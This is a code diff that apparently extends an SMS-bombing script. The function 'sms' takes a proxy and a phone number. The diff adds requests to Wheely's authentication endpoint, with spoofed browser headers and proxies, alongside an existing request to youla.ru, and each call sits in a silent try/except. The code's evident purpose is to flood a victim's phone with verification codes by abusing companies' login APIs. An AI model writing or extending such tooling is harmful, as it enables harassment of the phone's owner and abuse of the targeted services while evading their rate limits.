@@ -133,6 +133,31 @@ def sms(prx, number, tm, code):
 
 				try:
 					header = {
+						"accept": "application/json, text/plain, */*",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en",
+						"content-length": "60",
+						"content-type": "application/json",
+						"dnt": "1",
+						"origin": "https://wheely.com",
+						"referer": "https://wheely.com/",
+						"sec-ch-ua": 'Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-dest": "empty",
+						"sec-fetch-mode": "cors",
+						"sec-fetch-site": "same-site",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
+					}
+
+					payload = {"app_id":"55e085968a5da59241000001","phone":"+"+number}
+					requests.post("https://api.wheely.com/v6/auth/oauth/token", json=payload, headers=header, proxies = proxies)
+				except:
+					pass
+
+				try:
+					header = {
 						"Accept": "*/*",
 						"Accept-Encoding": "gzip, deflate, br",
 						"Accept-Language": "en-US,en;q=0.9",
@@ -631,6 +656,31 @@ def sms(prx, number, tm, code):
 				try:
 					payload = {"phone": "+"+number}
 					requests.post("https://youla.ru/web-api/auth/request_code", data=payload)
+				except:
+					pass
+
+				try:
+					header = {
+						"accept": "application/json, text/plain, */*",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en",
+						"content-length": "60",
+						"content-type": "application/json",
+						"dnt": "1",
+						"origin": "https://wheely.com",
+						"referer": "https://wheely.com/",
+						"sec-ch-ua": 'Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-dest": "empty",
+						"sec-fetch-mode": "cors",
+						"sec-fetch-site": "same-site",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
+					}
+
+					payload = {"app_id":"55e085968a5da59241000001","phone":"+"+number}
+					requests.post("https://api.wheely.com/v6/auth/oauth/token", json=payload, headers=header)
 				except:
 					pass
 
